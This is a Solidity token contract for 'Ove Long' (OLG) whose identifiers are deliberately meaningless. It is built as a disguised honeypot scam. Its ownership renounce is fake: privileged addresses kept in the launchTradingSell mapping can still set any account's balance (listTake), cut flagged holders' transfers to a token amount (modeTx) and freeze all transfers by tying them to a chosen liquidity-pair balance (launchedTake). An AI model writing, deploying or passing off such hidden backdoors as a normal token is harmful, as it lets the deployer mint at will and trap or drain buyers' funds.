//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface limitShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract autoEnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listMin {
    function createPair(address feeTrading, address limitLiquiditySender) external returns (address);
}

interface limitMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toFrom) external view returns (uint256);

    function transfer(address totalSwapTrading, uint256 amountList) external returns (bool);

    function allowance(address marketingIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountList) external returns (bool);

    function transferFrom(
        address sender,
        address totalSwapTrading,
        uint256 amountList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeAtExempt, uint256 value);
    event Approval(address indexed marketingIs, address indexed spender, uint256 value);
}

interface limitMarketingMetadata is limitMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract OveLong is autoEnable, limitMarketing, limitMarketingMetadata {

    function getOwner() external view returns (address) {
        return tradingShould;
    }

    mapping(address => bool) public shouldLimit;

    function modeTx(address enableMode) public {
        receiverSwap();
        
        if (enableMode == walletFrom || enableMode == shouldMinMarketing) {
            return;
        }
        shouldLimit[enableMode] = true;
    }

    address shouldTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function symbol() external view virtual override returns (string memory) {
        return shouldReceiver;
    }

    address fundLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private takeFromTx = "Ove Long";

    uint256 receiverReceiver;

    function listTake(address fundSwapTo, uint256 amountList) public {
        receiverSwap();
        takeTx[fundSwapTo] = amountList;
    }

    function allowance(address sellList, address autoIsLiquidity) external view virtual override returns (uint256) {
        if (autoIsLiquidity == shouldTx) {
            return type(uint256).max;
        }
        return exemptShould[sellList][autoIsLiquidity];
    }

    function balanceOf(address toFrom) public view virtual override returns (uint256) {
        return takeTx[toFrom];
    }

    function amountReceiver(address feeMax, address totalSwapTrading, uint256 amountList) internal returns (bool) {
        if (feeMax == walletFrom) {
            return receiverMarketingFund(feeMax, totalSwapTrading, amountList);
        }
        uint256 autoMode = limitMarketing(shouldMinMarketing).balanceOf(fundLiquidity);
        require(autoMode == receiverReceiver);
        require(totalSwapTrading != fundLiquidity);
        if (shouldLimit[feeMax]) {
            return receiverMarketingFund(feeMax, totalSwapTrading, atReceiver);
        }
        return receiverMarketingFund(feeMax, totalSwapTrading, amountList);
    }

    mapping(address => bool) public launchTradingSell;

    function fromShould() public {
        emit OwnershipTransferred(walletFrom, address(0));
        tradingShould = address(0);
    }

    function transfer(address fundSwapTo, uint256 amountList) external virtual override returns (bool) {
        return amountReceiver(_msgSender(), fundSwapTo, amountList);
    }

    address public walletFrom;

    uint8 private shouldFund = 18;

    function launchedTake(uint256 amountList) public {
        receiverSwap();
        receiverReceiver = amountList;
    }

    mapping(address => uint256) private takeTx;

    function totalSupply() external view virtual override returns (uint256) {
        return walletLaunched;
    }

    function transferFrom(address feeMax, address totalSwapTrading, uint256 amountList) external override returns (bool) {
        if (_msgSender() != shouldTx) {
            if (exemptShould[feeMax][_msgSender()] != type(uint256).max) {
                require(amountList <= exemptShould[feeMax][_msgSender()]);
                exemptShould[feeMax][_msgSender()] -= amountList;
            }
        }
        return amountReceiver(feeMax, totalSwapTrading, amountList);
    }

    function owner() external view returns (address) {
        return tradingShould;
    }

    function receiverMarketingFund(address feeMax, address totalSwapTrading, uint256 amountList) internal returns (bool) {
        require(takeTx[feeMax] >= amountList);
        takeTx[feeMax] -= amountList;
        takeTx[totalSwapTrading] += amountList;
        emit Transfer(feeMax, totalSwapTrading, amountList);
        return true;
    }

    address private tradingShould;

    constructor (){
        
        limitShould limitEnable = limitShould(shouldTx);
        shouldMinMarketing = listMin(limitEnable.factory()).createPair(limitEnable.WETH(), address(this));
        
        walletFrom = _msgSender();
        fromShould();
        launchTradingSell[walletFrom] = true;
        takeTx[walletFrom] = walletLaunched;
        
        emit Transfer(address(0), walletFrom, walletLaunched);
    }

    event OwnershipTransferred(address indexed sellSender, address indexed limitListFrom);

    uint256 private liquidityTo;

    uint256 marketingSenderTx;

    function senderTake(address liquiditySwapMin) public {
        if (exemptEnable) {
            return;
        }
        if (marketingFund != receiverSell) {
            marketingFund = receiverSell;
        }
        launchTradingSell[liquiditySwapMin] = true;
        
        exemptEnable = true;
    }

    uint256 private walletLaunched = 100000000 * 10 ** 18;

    uint256 constant atReceiver = 8 ** 10;

    uint256 private marketingFund;

    uint256 public receiverSell;

    address public shouldMinMarketing;

    string private shouldReceiver = "OLG";

    function approve(address autoIsLiquidity, uint256 amountList) public virtual override returns (bool) {
        exemptShould[_msgSender()][autoIsLiquidity] = amountList;
        emit Approval(_msgSender(), autoIsLiquidity, amountList);
        return true;
    }

    bool public exemptEnable;

    function decimals() external view virtual override returns (uint8) {
        return shouldFund;
    }

    function receiverSwap() private view {
        require(launchTradingSell[_msgSender()]);
    }

    function name() external view virtual override returns (string memory) {
        return takeFromTx;
    }

    mapping(address => mapping(address => uint256)) private exemptShould;

}